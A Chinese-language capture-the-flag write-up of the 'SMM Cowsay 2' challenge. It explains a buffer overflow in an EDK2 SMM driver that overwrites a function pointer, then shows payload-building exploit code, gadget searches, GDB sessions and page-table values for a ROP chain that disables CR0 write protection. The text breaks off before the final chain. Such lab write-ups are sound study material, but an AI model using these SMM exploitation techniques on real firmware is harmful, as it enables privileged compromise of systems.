title="uictf2022-cowsay2"></a>uictf2022-cowsay2</h2><p><strong>learn rop</strong></p><h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><p>这个cowsay总共有三题都做一下</p><p>题目描述</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We asked that engineer to fix the issue, but I think he may have left a backdoor disguised as debugging code.</span><br></pre></td></tr></table></figure><p>题目环境与之前基本一样,但 <code>SmmCowsay.efi</code> 驱动程序的代码已更改。此外，我们不再拥有全局 RWX 内存，因为第五个 EDK2 补丁 ( <code>0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch</code> ) 现在不会解锁页表条目权限，而是显式地将包含该标志的内存区域设置为读保护！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SmmSetMemoryAttributes (</span><br><span class="line">  <span class="number">0x44440000</span>,</span><br><span class="line">  EFI_PAGES_TO_SIZE(<span class="number">1</span>),</span><br><span class="line">  EFI_MEMORY_RP<span class="comment">//read protect</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure><p>这意味着flag不可读了</p><p>提交消息中也给出了提示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">From: YiFei Zhu &lt;zhuyifei@google.com&gt;</span><br><span class="line">Date: Mon, 28 Mar 2022 17:55:14 -0700</span><br><span class="line">Subject: [PATCH 5/8] PiSmmCpuDxeSmm: Protect flag addresses</span><br><span class="line"></span><br><span class="line">So attacker must disable paging or overwrite page table entries</span><br><span class="line">(which would require disabling write protection in cr0... so, the</span><br><span class="line">latter is redundant to former)</span><br></pre></td></tr></table></figure><p>EDK2 SMI 处理程序所做的第一件事是设置 4 级页表并启用 64 位长模式，因此 SMM 代码在带有页表的 64 位模式下运行。</p><p>页表中存储的虚拟地址与物理地址1:1对应，因此页表本身仅作为管理不同内存区域权限的一种方式（例如，不包含代码的页的页表项将具有NX 位设置）。标志页（ <code>0x44440000</code> ）被标记为“读保护”，这仅意味着相应的页表条目将清除当前位，因此任何访问都将导致页错误。</p><p>之前binexec的cowsay数据使用指针传输</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">+  Buffer-&gt;MessageLength = MessageLen;</span><br><span class="line">+  CopyMem(Buffer-&gt;Data, Message, MessageLen);</span><br></pre></td></tr></table></figure><p>但现在直接使用数据传输</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>让我们看看 <code>SmmCowsay.efi</code> 的更新代码。现在通讯情况如何？我们有一个新的 <code>mDebugData</code> 结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  CHAR16 Message[<span class="number">200</span>];</span><br><span class="line">  VOID <span class="title function_">EFIAPI</span> <span class="params">(* <span class="keyword">volatile</span> CowsayFunc)</span><span class="params">(IN CONST CHAR16 *Message, IN UINTN MessageLen)</span>;</span><br><span class="line">  BOOLEAN <span class="keyword">volatile</span> Icebp;</span><br><span class="line">  UINT64 <span class="keyword">volatile</span> Canary;</span><br><span class="line">&#125; mDebugData;</span><br></pre></td></tr></table></figure><p>该结构保存一个 <code>-&gt;CowsayFunc</code> 函数指针，该指针在驱动程序初始化时设置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mDebugData.CowsayFunc = Cowsay;</span><br></pre></td></tr></table></figure><p>SMM处理程序代码在接收到消息时使用 <code>mDebugData</code> 结构，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmCowsayHandler</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="params">  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_STATUS Status;</span><br><span class="line">  UINTN TempCommBufferSize;</span><br><span class="line">  UINT64 Canary;</span><br><span class="line"></span><br><span class="line">  DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Enter\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!CommBuffer || !CommBufferSize)</span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line"></span><br><span class="line">  TempCommBufferSize = *CommBufferSize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... irrelevant code ...</span></span><br><span class="line"></span><br><span class="line">  Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span><br><span class="line">  <span class="keyword">if</span> (EFI_ERROR(Status))</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... irrelevant code ...</span></span><br><span class="line"></span><br><span class="line">  SetMem(mDebugData.Message, <span class="keyword">sizeof</span>(mDebugData.Message), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">  DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Exit\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题就出在：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);</span><br></pre></td></tr></table></figure><p>这里我们有一个类似 memcpy 的函数，使用 <code>-&gt;MessageLength</code> 从 <code>EFI_SMM_COMMUNICATE_HEADER</code> 的 <code>-&gt;Data</code> 字段（作为 <code>CommBuffer</code> 传递）执行复制字段作为大小（作为 <code>CommBufferSize</code> 传递）</p><p>那么这里是存在一个溢出的,如果数据大小超过<code>400</code>,那么就会覆盖到<code>CowsayFunc</code>字段</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>情况看起来很简单：发送 400 字节的垃圾，后跟一个地址，并在系统管理模式内获得 RIP 控制。一旦我们有了 RIP 控制，我们就可以构建一个 ROP 链来完成以下二者中的一个操作</p><ul><li>(A)完全禁用分页并读取标志</li><li>(B)关闭 <code>CR0.WP</code> （因为页表是只读的）并修补页面标志的表条目以使其可读。<a href="https://www.cnblogs.com/chingliu/archive/2011/08/28/2223804.html">关于cr0寄存器</a></li></ul><p>方法A是作者的解决方案。事实上，SMM GDT 中已经有一个很好的 32 位保护模式段描述符，我们可以将其用于代码段</p><p>但这里选择使用B方法</p><p>不过，构建 ROP 链存在一些问题：在 <code>call</code> 到我们的地址之后，我们失去了对执行的控制，因为我们无法控制 SMM 堆栈。简单地用我们的 shellcode 缓冲区的地址覆盖函数指针并在 SMM 中执行任意代码会很好，但正如我们之前所看到的，SMM 无法访问该内存区域，这只会导致崩溃。</p><p>qemu启动脚本增加</p><p><code>-global isa-debugcon.iobase=0x402 -debugcon file:../../debug.log</code></p><p>现在可以运行挑战并查看 <code>debug.log</code> 。在各种调试消息中，EDK2 打印它加载的每个驱动程序的基地址和入口点：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> handout/run; ./run.sh; <span class="built_in">cd</span> -</span><br><span class="line">$ <span class="built_in">cat</span> debug.log | grep <span class="string">&#x27;SMM driver&#x27;</span></span><br><span class="line">Loading SMM driver at 0x00007FE3000 EntryPoint=0x00007FE526B CpuIo2Smm.efi</span><br><span class="line">Loading SMM driver at 0x00007FD9000 EntryPoint=0x00007FDC6E4 SmmLockBox.efi</span><br><span class="line">Loading SMM driver at 0x00007FBF000 EntryPoint=0x00007FCC159 PiSmmCpuDxeSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F99000 EntryPoint=0x00007F9C851 FvbServicesSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F83000 EntryPoint=0x00007F8BAD0 VariableSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EE7000 EntryPoint=0x00007EE99E7 SmmCowsay.efi</span><br><span class="line">Loading SMM driver at 0x00007EDF000 EntryPoint=0x00007EE2684 CpuHotplugSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EDD000 EntryPoint=0x00007EE2A1E SmmFaultTolerantWriteDxe.efi</span><br></pre></td></tr></table></figure><p>毫无疑问，所有这些驱动程序的 <code>.text</code> 部分都将包含我们可以在 SMM 中执行的代码。让我们使用 EDK2 调试日志提供的基地址来使用 <code>ROPGadget</code> 来查找它们：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> handout/edk2_artifacts</span><br><span class="line">ROPgadget --binary CpuIo2Smm.efi  --offset 0x00007FE3000 &gt;&gt; ../../gadgets.txt</span><br><span class="line">ROPgadget --binary SmmLockBox.efi --offset 0x00007FD9000 &gt;&gt; ../../gadgets.txt</span><br><span class="line"><span class="comment"># ... and so on ...</span></span><br></pre></td></tr></table></figure><p>尽管我们有gadget，但我们需要多个gadget来构建有用的 ROP 链。在第一个 <code>ret</code> 之后，如果我们不以某种方式将堆栈（RSP）移动到受控内存区域，控制权将返回到 <code>SmmCowsayHandler</code> ，因此我们需要的第一个gadget是能够将堆栈迁移到我们想要的位置的一个。</p><p>有这么一个非常好的gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MdePkg/Library/BaseLib/X64/LongJump.nasm</span></span><br><span class="line">CetDone:</span><br><span class="line"></span><br><span class="line">    mov     rbx, [rcx]</span><br><span class="line">    mov     rsp, [rcx + <span class="number">8</span>]</span><br><span class="line">    mov     rbp, [rcx + <span class="number">0x10</span>]</span><br><span class="line">    mov     rdi, [rcx + <span class="number">0x18</span>]</span><br><span class="line">    mov     rsi, [rcx + <span class="number">0x20</span>]</span><br><span class="line">    mov     r12, [rcx + <span class="number">0x28</span>]</span><br><span class="line">    mov     r13, [rcx + <span class="number">0x30</span>]</span><br><span class="line">    mov     r14, [rcx + <span class="number">0x38</span>]</span><br><span class="line">    mov     r15, [rcx + <span class="number">0x40</span>]</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    jmp     qword [rcx + <span class="number">0x48</span>]</span><br></pre></td></tr></table></figure><p>我们的函数指针将使用 <code>CommBuffer</code> 作为第一个参数 (RCX) 进行调用，因此跳转到此处将直接从我们提供的数据加载一堆寄存器，包括 RSP。</p><p>这非常好，确实作者的解决方案使用它可以轻松迁移堆栈并继续 ROP 链，但是 <code>ROPgadget</code> 不够聪明，无法为我们找到这个gadget</p><p>所以原作者选用了一种更为复杂的方法</p><h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>无论如何，我们仍然有一个不错的技巧。我们确实无法控制 SMM 堆栈，但是如果我们的某些寄存器溢出到堆栈上怎么办？使用 <code>ret 0x123</code> 或 <code>add rsp, 0x123; ret</code> 形式的gadget，我们将能够向前移动堆栈指针并使用我们在 SMM 堆栈上控制的任何内容作为另一个gadget。为了检查这一点，我们可以将调试器附加到 QEMU 并在 <code>SmmCowsayHandler()</code> 中调用 <code>mDebugData.CowsayFunc()</code> 时中断。</p><p>我们只需在命令行中添加 <code>-s</code> 即可在 QEMU 中启用调试，然后从 GDB 附加到它。</p><p>大佬编写了一个简单的 Python GDB 插件来从 <code>.debug</code> 文件加载调试符号</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddAllSymbols</span>(gdb.Command):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span> (self):</span><br><span class="line">        <span class="built_in">super</span> (AddAllSymbols, self).__init__ (<span class="string">&#x27;add-all-symbols&#x27;</span>,</span><br><span class="line">            gdb.COMMAND_OBSCURE, gdb.COMPLETE_NONE, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invoke</span>(<span class="params">self, args, from_tty</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Adding symbols for all EFI drivers...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;debug.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">if</span> line.startswith(<span class="string">&#x27;Loading SMM driver at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">4</span>]</span><br><span class="line">                <span class="keyword">elif</span> line.startswith(<span class="string">&#x27;Loading driver at&#x27;</span>) <span class="keyword">or</span> line.startswith(<span class="string">&#x27;Loading PEIM at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">3</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                path = <span class="string">&#x27;handout/edk2_artifacts/&#x27;</span> + line[-<span class="number">1</span>].replace(<span class="string">&#x27;.efi&#x27;</span>, <span class="string">&#x27;.debug&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">                    gdb.execute(<span class="string">&#x27;add-symbol-file &#x27;</span> + path + <span class="string">&#x27; -readnow -o &#x27;</span> + base)</span><br><span class="line"></span><br><span class="line">AddAllSymbols()</span><br></pre></td></tr></table></figure><p>漏洞利用的第一部分与 SMM Cowsay 1 相同：获取 <code>BootServices-&gt;AllocatePool</code> 和 <code>-&gt;LocateProtocol</code> ，找到 <code>SmmCommunication</code> 协议，分配一些内存进行写入我们的消息，并通过其 SMI 处理程序将其发送到 <code>SmmCowsay</code> 。唯一改变的是我们发送的内容：这次 <code>EFI_SMM_COMMUNICATE_HEADER</code> 的 <code>-&gt;Data</code> 字段将填充 400 字节的垃圾字符串，再加上 8 个字节以覆盖函数指针。</p><p>我们将使用易于识别的值填充所有未使用的通用寄存器，以便我们可以看到堆栈上溢出的内容：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;Attach GDB now and press [ENTER] to continue...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(<span class="number">0x4141414141414141</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;<span class="number">0x18</span> + <span class="built_in">len</span>(payload)&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ebx, 0x0b0b0b0b</span></span><br><span class="line"><span class="string">    mov esi, 0x01010101</span></span><br><span class="line"><span class="string">    mov edi, 0x02020202</span></span><br><span class="line"><span class="string">    mov ebp, 0x03030303</span></span><br><span class="line"><span class="string">    mov r9 , 0x09090909</span></span><br><span class="line"><span class="string">    mov r10, 0x10101010</span></span><br><span class="line"><span class="string">    mov r11, 0x11111111</span></span><br><span class="line"><span class="string">    mov r12, 0x12121212</span></span><br><span class="line"><span class="string">    mov r13, 0x13131313</span></span><br><span class="line"><span class="string">    mov r14, 0x14141414</span></span><br><span class="line"><span class="string">    mov r15, 0x15151515</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>                   /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    /* payload will be appended here to serve as Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + payload.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line">conn.interactive() <span class="comment"># Let&#x27;s see what happens</span></span><br></pre></td></tr></table></figure><p>现在我们可以使用以下脚本启动漏洞利用并附加 GDB：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> script.gdb</span><br><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> gdb_plugin.py</span><br><span class="line">add-all-symbols</span><br><span class="line"></span><br><span class="line"><span class="built_in">break</span> *(SmmCowsayHandler + 0x302)</span><br><span class="line"><span class="built_in">continue</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gdb -x script.gdb</span><br><span class="line">...</span><br><span class="line">Breakpoint 1, 0x0000000007ee92c5 <span class="keyword">in</span> SmmCowsayHandler (CommBufferSize=&lt;optimized out&gt;, CommBuffer=0x69bb030, ...</span><br><span class="line">(gdb) i r rax</span><br><span class="line">rax            0x4141414141414141  4702111234474983745</span><br><span class="line"></span><br><span class="line">(gdb) si</span><br><span class="line">0x4141414141414141 <span class="keyword">in</span> ?? ()</span><br><span class="line"></span><br><span class="line">(gdb) x/100gx <span class="variable">$rsp</span></span><br><span class="line">0x7fb6a78:  0x0000000007ee92c7  0x0000000007ffa8d8</span><br><span class="line">0x7fb6a88:  0x0000000007ff0bc5  0x00000000069bb030</span><br><span class="line">0x7fb6a98:  0x0000000007fb6c38  0x0000000007fb6b80</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x7fb6b48:  0x00000000069bb018  0x0000000013131300</span><br><span class="line">0x7fb6b58:  0x0000000014141414  0x0000000015151515</span><br></pre></td></tr></table></figure><p>看起来 R13（除了 LSB）、R14 和 R15 不知何故在 <code>rsp + 0xe0</code> 处溢出到堆栈上。从 <code>call rax</code> 返回后， <code>SmmCowsayHandler</code> 中的代码执行以下操作</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/30i SmmCowsayHandler + 0x302</span><br><span class="line">   0x7ee92c5 &lt;SmmCowsayHandler+770&gt;:    call   rax</span><br><span class="line">   0x7ee92c7 &lt;SmmCowsayHandler+772&gt;:    <span class="built_in">test</span>   bl,bl</span><br><span class="line">   ... a bunch of useless stuff ...</span><br><span class="line">   0x7ee92f7 &lt;SmmCowsayHandler+820&gt;:    add    rsp,0x40</span><br><span class="line">   0x7ee92fb &lt;SmmCowsayHandler+824&gt;:    xor    eax,eax</span><br><span class="line">   0x7ee92fd &lt;SmmCowsayHandler+826&gt;:    pop    rbx</span><br><span class="line">   0x7ee92fe &lt;SmmCowsayHandler+827&gt;:    pop    rsi</span><br><span class="line">   0x7ee92ff &lt;SmmCowsayHandler+828&gt;:    pop    rdi</span><br><span class="line">   0x7ee9300 &lt;SmmCowsayHandler+829&gt;:    pop    r12</span><br><span class="line">   0x7ee9302 &lt;SmmCowsayHandler+831&gt;:    pop    r13</span><br><span class="line">   0x7ee9304 &lt;SmmCowsayHandler+833&gt;:    ret</span><br></pre></td></tr></table></figure><p>因此，在最后一个 <code>ret</code> 时，我们将使寄存器溢出到堆栈上的距离更近。非常方便的是，在我们转储的小工具中，在 <code>VariableSmm.efi + 0x8a49</code> 处有一个 <code>ret 0x70</code> 。我们可以使用这个小工具将 RSP 精确地<strong>移动到溢出的 R14 之上</strong>，从而使我们能够执行另一个 <code>pop rsp; ret</code> 形式的gadget，这将从 R15 的值中获取 RSP 的新值堆栈！在此之后，我们完全控制了堆栈，我们可以编写更长的ROP链。</p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h4><p>迁移堆栈并启动真正的 ROP 链后，我们需要以下gadget</p><ul><li>设置 CR0 以便能够禁用 <code>CR0.WP</code> 编辑页表。</li><li>写入任意地址的内存以覆盖标志地址的页表条目。</li><li>从内存读入寄存器以获得标志。</li></ul><p>只要有一点耐心，所有这些都可以轻松找到，因为我们手上有很多gadget</p><p>由于地址不会改变，所以我们实际上不需要担心遍历页表：我们只需使用 GDB 找到 <code>0x44440000</code> 的页表条目的地址，然后将其硬编码到漏洞利用中:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl4_idx</span> = (0x44440000 &gt;&gt; 12 + 9 + 9 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl3_idx</span> = (0x44440000 &gt;&gt; 12 + 9 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl2_idx</span> = (0x44440000 &gt;&gt; 12 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl1_idx</span> = (0x44440000 &gt;&gt; 12) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl4_entry</span> = *(unsigned long *)(<span class="variable">$cr3</span> + 8 * <span class="variable">$lvl4_idx</span>)</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl3_entry</span> = *(unsigned long *)((<span class="variable">$lvl4_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl3_idx</span>)</span><br><span class="line">(gdb) set <span class="variable">$lvl2_entry</span> = *(unsigned long *)((<span class="variable">$lvl3_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl2_idx</span>)</span><br><span class="line"></span><br><span class="line">(gdb) set <span class="variable">$lvl1_entry_addr</span> = (<span class="variable">$lvl2_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl1_idx</span></span><br><span class="line">(gdb) set <span class="variable">$lvl1_entry</span>      = *(unsigned long *)<span class="variable">$lvl1_entry_addr</span></span><br><span class="line"></span><br><span class="line">(gdb) printf &quot;PTE at <span class="number">0</span>x%lx, value = <span class="number">0</span>x%<span class="number">016</span>lx\n&quot;, <span class="variable">$lvl1_entry_addr</span>, <span class="variable">$lvl1_entry</span></span><br><span class="line"></span><br><span class="line">PTE at <span class="number">0</span>x7ed0200, value = <span class="number">0</span>x8000000044440066</span><br></pre></td></tr></table></figure><p>请注意 <code>0x8000000044440066</code> 设置位 63 (NX)与位 0 , 1 未设置（不存在，不可读写）。我们需要设置位 0 以便将页面标记为存在，因此我们想要的值为 <code>0x8000000044440067</code> 。</p><p>从 GDB 检查 CR0 的值，我们得到 <code>0x80010033</code> ：关闭 WP 位会得到 <code>0x80000033</code> ，所以这就是我们在尝试编辑页表条目之前要写入 CR0 的内容在 <code>0x7ed0200</code> 。</p><p>找到我们需要的gadegt后，真正的 ROP 